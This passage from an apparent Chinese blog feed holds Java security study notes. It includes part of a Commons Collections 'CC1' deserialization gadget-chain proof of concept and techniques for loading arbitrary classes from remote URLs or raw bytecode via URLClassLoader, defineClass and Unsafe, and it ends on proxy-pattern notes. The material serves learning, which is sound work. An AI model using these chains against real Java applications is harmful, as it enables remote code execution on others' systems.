class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span> <span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>            oos.writeObject(o);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>    &#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>CC1</p><p>TransformedMap:</p><p>AnnotationInvocationHandler.readObject. memberValue.setValue</p><p>​                                                 MapEntry.setValue.parent.checkSetValue</p><p>​         TransformedMap.checkSetValue.valueTransform.transform</p><p>​ChainedTransformed.transform</p><p>​    ConstantTransformer.tansform</p><p>​ InvokerTransformer.tansform</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>类的动态加载</title>
    <link href="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <url>/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h3 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h3><span id="more"></span><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><ul><li><p><strong>静态代码块</strong>在类加载时已经被加载了</p><ul><li>静态代码块用来初始化静态成员变量的，在<em>类加载的初始化阶段执行</em></li></ul></li><li><p><strong>构造代码块和构造函数</strong>都是在实例化对象时会被调用，构造代码块依赖于构造函数，先于构造函数执行</p><ul><li>构造代码块的作用也是和构造函数的一样，用于初始化对象，并且只要创建一个对象，构造代码块都会执行一次，但创建一个对象会自动选择调有参还是无参构造方法，构造方法不会全调</li></ul></li></ul><p><strong>初始化：</strong>类的class不会触发初始化，Class的forName和Object的getClass会触发初始化</p><p>**实例化会触发…**：1.类加载初始化 2.构造代码块 3.(有参或无参)构造器  {就是静态代码块和构类的}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>       Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;com.test.classLoad.Person&quot;</span>, <span class="hljs-literal">false</span>, c1);<br>        c.newInstance();<span class="hljs-comment">//创建一般对象触发构造代码块和无参构造器</span><br>       System.out.println(<span class="hljs-string">&quot;=======&quot;</span>);<br>       c.getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class).newInstance(<span class="hljs-string">&quot;xiao&quot;</span>,<span class="hljs-number">18</span>);<span class="hljs-comment">//创建一般对象触发构造代码块和有参构造器</span><br>       System.out.println(<span class="hljs-string">&quot;=======&quot;</span>);<br>       <span class="hljs-comment">/*下面</span><br><span class="hljs-comment">       *触发：类加载初始化--&gt;静态代码块</span><br><span class="hljs-comment">       *       实例化对象---&gt;构造代码块and有参构造器</span><br><span class="hljs-comment">        */</span><br>       System.out.println(<span class="hljs-string">&quot;即使程序中会有多个地方触发类加载初始化，但static代码块只执行一次噢&quot;</span>);<br>       <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;wang&quot;</span>,<span class="hljs-number">20</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250410143734859.png" alt="image-20250410143734859"></p><hr><h4 id="————–"><a href="#————–" class="headerlink" title="————–"></a>————–</h4><h4 id="forName"><a href="#forName" class="headerlink" title="forName()"></a>forName()</h4><p><strong>forName（）它可以选择触发或者不触发初始化：</strong></p><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250409211313959.png" alt="image-20250409211313959"></p><ul><li><p>ClassLoader :抽象类</p><p>它里面的静态方法getSystemClassLoader() 获得系统加载类</p></li><li><p>当传参布尔值为false时，由Class.forName()创建类对象时<strong>不会触发初始化！！</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>    Class.forName(<span class="hljs-string">&quot;com.test.classLoad.A&quot;</span>,<span class="hljs-literal">false</span>,c1);<br></code></pre></td></tr></table></figure><hr><h4 id="ClassLoader-loadClass（）"><a href="#ClassLoader-loadClass（）" class="headerlink" title="ClassLoader.loadClass（）"></a>ClassLoader.loadClass（）</h4><p>它 不触发初始化，类加载器获取到Class类对象,并实例化</p><p><em>欸这不就是之前学类加载过程时那句话的具体实现嘛：程序编译成class文件后，通过类加载器加载Class对象到堆中。</em>每一个加载到内存的类都由一个 Class 对象来表示每一个 Class 对象都有一个指向加载该类的类加载器的引用,通过 <code>getClassLoader()</code>方法就可以获取到此引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<span class="hljs-comment">//获得系统类加载器c1</span><br> Class&lt;?&gt; c = cl.loadClass(<span class="hljs-string">&quot;com.test.classLoad.Person&quot;</span>);<span class="hljs-comment">//！！！！这里loadClass方法获得Class对象是不会初始化的   也就与之前学的那句话相符</span><br> c.newInstance();<br><span class="hljs-comment">//到这儿肯定调的是static代码块，构造代码块，无参构造器</span><br></code></pre></td></tr></table></figure><hr><h4 id="父类加载器"><a href="#父类加载器" class="headerlink" title="父类加载器"></a>父类加载器</h4><p>先了解一下父类加载器吧</p><ul><li><p>对于开发人员编写的类加载器来说</p><ul><li>其父类加载器是<em>加载此类加载器 Java 类的类加载器。</em>因为类加载器 Java 类如同其它的 Java 类一样，也是要由类加载器来加载的。调用 <code>getParent()</code>方法来输出父类加载器。一般来说，开发人员编写的类加载器的父类加载器是系统类加载器(AppClassLoader）。</li></ul></li><li><p>对于系统提供的类加载器来说</p><ul><li>系统类加载器（AppClassLoader)的父类加载器是扩展类加载器ExtClassLoader</li><li>而扩展类加载器ExtClassLoader的父类加载器是启动类加载器BootstrapClassLoader；</li></ul></li></ul><p>Java虚拟机判断两个类是否相同除了要看类的全名是否相同还要看加载此类的类加载器是否相同</p><h4 id="类加载的底层"><a href="#类加载的底层" class="headerlink" title="类加载的底层"></a>类加载的底层</h4><p>不同版本的jdk是不一样的，下面按组长视频的<strong>jdk8</strong>学习具体的类加载器加载一个类到内存中，类加载底层实现（这里注意：调试的时候要设置一下取消勾选跳过加载器）</p><p><a href="https://blog.csdn.net/weixin_54106682/article/details/135879953">安装java8和java21共存，如何自由切换java版本？_java切换版本-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_38322527/article/details/114592338">IDEA——修改开发环境为 JDK 1.8_javaweb项目jdk为1.8怎么修改-CSDN博客</a></p><p>下面的类加载学习参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/54693308">好怕怕的类加载器 - 知乎</a></p><p><a href="https://qchery.github.io/2019/10/11/">https://qchery.github.io/2019/10/11/</a></p><p><a href="https://github.com/burningmyself/burningmyself.github.io/blob/master/docs/java/load-class.md">https://github.com/burningmyself/burningmyself.github.io/blob/master/docs/java/load-class.md</a></p><p><a href="https://louluan.blog.csdn.net/article/details/50529868">https://louluan.blog.csdn.net/article/details/50529868</a></p><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250410162826850.png" alt="image-20250410162826850"></p><p><strong>Launcher</strong>是JRE中用于启动程序入口main()的类，让我们看下Launcher的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Launcher</span><span class="hljs-params">()</span> &#123;<br>        Launcher.ExtClassLoader var1;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//加载扩展类类加载器</span><br>            var1 = Launcher.ExtClassLoader.getExtClassLoader();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var10) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(<span class="hljs-string">&quot;Could not create extension class loader&quot;</span>, var10);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//加载应用程序类加载器，并设置parent为extClassLoader</span><br>            <span class="hljs-built_in">this</span>.loader = Launcher.AppClassLoader.getAppClassLoader(var1);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(<span class="hljs-string">&quot;Could not create application class loader&quot;</span>, var9);<br>        &#125;<br>        <span class="hljs-comment">//设置默认的线程上下文类加载器为AppClassLoader</span><br>        Thread.currentThread().setContextClassLoader(<span class="hljs-built_in">this</span>.loader);<br>        <span class="hljs-comment">//此处删除无关代码。。。</span><br>        &#125;<br></code></pre></td></tr></table></figure><p>在虚拟机启动的时候会初始化BootstrapClassLoader，然后在Launcher类中去加载ExtClassLoader、AppClassLoader，并将AppClassLoader的parent设置为ExtClassLoader，并设置线程上下文类加载器。</p><h4 id="类的加载工作"><a href="#类的加载工作" class="headerlink" title="类的加载工作"></a>类的加载工作</h4><p>这块儿具体就是一个双亲委派机制~~</p><ol><li>检查该类是否已经被当前的类加载器加载。因为一旦一个类被加载到JVM中，同一个类就不会被再次载入了。加载到内存中的Class对象是唯一的</li></ol><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250410203627775.png" alt="image-20250410203627775"></p><ol start="2"><li><p>若已经加载过则直接返回对应的Class实例就好了</p><p>若没加载，则就要委托给父加载器，现在是APP，则让父类加载器EXT加载（调用父类加载器的loadClass，还是这个代码）</p><p>Ext没有（parent&#x3D;null，实际上是等于Bootstrap ClassLoader，因为它是c写的所以在java中就是null），则看是已经被启动类加载器BootstrapClassLoader加载</p><p>（下面的代码在AppClassLoader时走的是if后面的，ExtClassLoader时走的是else后面的）</p></li></ol><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250410220807191.png" alt="image-20250410220807191"></p><ol start="3"><li><p><em><strong>!!!!!!现在还在Ext还没出去</strong></em>，上面的都没加载，则尝试该类加载器Ext自己加载，则调用 <code>findClass()</code> 方法加载类</p><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250412151107691-17444418702692.png" alt="image-20250412151107691"></p></li><li><p>调Ext的findClass(),但EXT和APP都没有findClass方法，就会调它的父类URLClassLoader的findClass了，没有找到，就退出回到APP的（c&#x3D;&#x3D;null）了，继续调APP的findClass即调URLClassLoader的findclass—&gt;URLClassLoader的defineClass—&gt;SecureClassLoader defineClass—&gt;ClassLoader  defineClass</p></li></ol><p>继承关系：ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p><p>执行：loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p><hr><h4 id="————–-1"><a href="#————–-1" class="headerlink" title="————–"></a>————–</h4><p>上面是类加载器的具体工作了，下面学习安全方面的类加载</p><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>任意类加载    file&#x2F;http&#x2F;jar</p><p>进行操作时在本地报错：<code>ClassNotFoundException：Try02 (wrong name: com/test/classLoad/Try02</code>·</p><p>http协议报错<code>.NoClassDefFoundError: Try02 (wrong name: com/test/classLoad/Try02)</code>,但看服务是收到了请求的</p><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250412171220098-17444491417233.png" alt="image-20250412171220098"></p><p>在快放下它的时候终于终于在一篇文章里知道原因了！！~~，因为编译的时候没有删除package全包名，（带上包名，URLClassLoader当然会从本地去加载指定class类了那肯定就找不到我们外部加载的类）</p><p>下面是它的加载代码</p><p>http协议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:9999/&quot;</span>)&#125;);<br>Class&lt;?&gt; c1 = urlClassLoader.loadClass(<span class="hljs-string">&quot;Test95&quot;</span>);<br>c1.newInstance();<span class="hljs-comment">//触发初始化</span><br></code></pre></td></tr></table></figure><p>本地加载；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\tmp\\classes\\&quot;</span>)&#125;);<br>Class&lt;?&gt; c1 = urlClassLoader.loadClass(<span class="hljs-string">&quot;Test95&quot;</span>);<br>c1.newInstance();<br></code></pre></td></tr></table></figure><p>jar:</p><p>生成jar文件</p><ol><li><p>先编译.java文件生成.class文件</p></li><li><p>在终端对应目录执行命令    jar cf myapp.jar MyClass.class（<code>c</code> 表示创建一个新的 JAR 文件。<code>f</code> 指定 JAR 文件的名称，这里是 <code>myapp.jar</code>。<code>MyClass.class</code> 是要包含在 JAR 文件中的编译后的 Java 类文件。）</p><p><img src="/2025/04/10/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20250412205821124-17444627029651.png" alt="image-20250412205821124"></p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///D:\\tmp\\classes\\myapp.jar!/&quot;</span>)&#125;);<br>Class&lt;?&gt; c1 = urlClassLoader.loadClass(<span class="hljs-string">&quot;Test95&quot;</span>);<span class="hljs-comment">//这里的时jar保存编译后的class文件</span><br>c1.newInstance();<br></code></pre></td></tr></table></figure><p>jar包也可以用http协议</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://localhost:9595/myapp.jar!/&quot;</span>)&#125;);<br>Class&lt;?&gt; c1 = urlClassLoader.loadClass(<span class="hljs-string">&quot;Test95&quot;</span>);<br>c1.newInstance();<br></code></pre></td></tr></table></figure><h4 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass()"></a>defineClass()</h4><p><strong>ClassLoader.defineClass 字节码加载任意类</strong>，defineClass是一个protected的方法，所以就得反射调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br><span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethd</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>defineClassMethd.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\tmp\\classes\\Test95.class&quot;</span>));<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) defineClassMethd.invoke(cl, <span class="hljs-string">&quot;Test95&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>c.newInstance();<br></code></pre></td></tr></table></figure><h4 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a>Unsafe</h4><p>Unsafe.defineClass字节码加载  </p><p>defineClass方法虽然是public，但是类但不能直接生成</p><ul><li>原因是：它的构造函数是private，这个设计是单例模式，Runtime类也是如此，这块儿就，通过反射获得属性theUnsafe获得一个Unsafe对象，来调用defineClass方法</li></ul><p>Unsafe类中属性theUnsafe就是一个Unsafe对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>Class&lt;Unsafe&gt; c = Unsafe.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<span class="hljs-comment">//获得属性theUnsafe</span><br>theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//获取属性返回结果强转为Unsafe对象</span><br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\tmp\\classes\\Test95.class&quot;</span>));<br>Class&lt;?&gt; c2 = unsafe.defineClass(<span class="hljs-string">&quot;Test95&quot;</span>, code, <span class="hljs-number">0</span>, code.length, cl, <span class="hljs-literal">null</span>);<br>c2.newInstance();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>静态代理&amp;&amp;动态代理</title>
    <link href="/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&amp;&amp;%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&amp;&amp;%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>静态代理&amp;&amp;动态代理</p><span id="more"></span><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><ul><li>真实类，代理类，<strong>都实现接口</strong></li><li>在代理类构造器中传入<strong>正常的真实类的对象</strong>(实现真实类，代理类对接),重写代理类中的方法<strong>即用真实类对象调用真实类方法</strong>（有点像将  正常的对象调用方法  封装到代理类的方法中<em>来间接调用</em>，对象也传进去），再添加增强的功能</li></ul><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><p>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span>  <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">creat</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>真实类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;展示&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">creat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;creat&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;update&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span>  &#123;<br>    IUser user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserProxy</span><span class="hljs-params">(IUser user)</span> &#123;<br>        <span class="hljs-built_in">this</span>.user = user;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>      user.show();<br>      System.out.println(<span class="hljs-string">&quot;调用了show&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">creat</span><span class="hljs-params">()</span> &#123;<br>        user.creat();<br>        System.out.println(<span class="hljs-string">&quot;调用了Creat&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        user.update();<br>        System.out.println(<span class="hljs-string">&quot;调用了Update&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//直接连接调用</span><br>       <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserImpl</span>();<span class="hljs-comment">//接口类引用指向实现类对象</span><br>      <span class="hljs-comment">//  user.show();</span><br><br><br>        <span class="hljs-comment">//静态代理</span><br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxy</span>(user);<span class="hljs-comment">//传进真正的对象</span><br>        userProxy.show();<br>        userProxy.creat();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&&%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/联想截图_20250407204639.png" alt="联想截图_20250407204639" style="zoom:50%;"><h4 id="疑问-结论"><a href="#疑问-结论" class="headerlink" title="疑问&amp;&amp;结论"></a>疑问&amp;&amp;结论</h4><p><em>学习ing对代理类对象调用 ‘与真实类的方法重名的 